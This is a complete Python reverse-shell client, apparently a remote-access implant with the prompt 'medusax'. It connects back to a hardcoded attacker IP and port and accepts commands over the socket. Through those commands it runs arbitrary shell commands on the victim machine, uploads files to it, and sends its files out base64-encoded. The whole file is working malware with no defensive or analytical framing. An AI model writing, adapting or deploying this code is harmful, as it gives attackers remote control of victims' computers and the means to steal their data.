import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "10.0.1.37"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

# Function to execute commands on the target machine
def execute_command(command):
    return subprocess.run(command, shell=True, capture_output=True)

# Function to send JSON data
def send_json(sock, data):
    json_data = json.dumps(data)
    sock.sendall(json_data.encode())

# Function to receive JSON data
def receive_json(sock):
    json_data = ""
    while True:
        try:
            json_data = json_data + sock.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

# Function to read a file and encode it in base64
def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

# Function to write a file from base64 content
def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
    return "[+] Upload successful [+]"

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    sock.connect((HOST, PORT))
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        # Send the current prompt to the server
        sock.sendall(current_prompt.encode("utf-8"))

        # Receive the command from the server
        command = receive_json(sock)

        # Handle the 'km' command to completely disconnect
        if command[0] == "km":
            sock.close()
            break

        # Handle the 'upload' command
        elif command[0] == "upload":
            response = write_file(command[1], command[2])

        # Handle the 'download' command
        elif command[0] == "download":
            try:
                response = read_file(command[1])
            except Exception as e:
                response = str(e)

        # Handle the 'shell' command to enter the shell mode
        elif command[0] == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                response = "Entering remote shell mode. Type 'exit' to leave."
            except Exception as e:
                response = f"Failed to switch to C:\\: {e}"

        # Handle the 'shell -d <directory>' command to set a specific directory
        elif command[0].startswith("shell -d"):
            try:
                directory = command[1]
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                response = f"Changed directory to {directory}"
            except Exception as e:
                response = f"Failed to change directory: {e}"

        # If in shell mode, process shell commands
        elif in_shell_mode:
            if command[0] == "exit":
                # Exit the shell and return to the default prompt
                in_shell_mode = False  # Disable shell mode
                current_prompt = default_prompt
                response = "Exiting remote shell mode."
            else:
                # Execute the received shell command
                output = execute_command(" ".join(command))
                response = output.stdout.decode() + output.stderr.decode()

        # If not in shell mode, reject unrecognized commands
        else:
            response = "Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect."

        # Send the response back to the server
        send_json(sock, response)

except Exception as e:
    print(f"Error: {e}")
    sock.close()
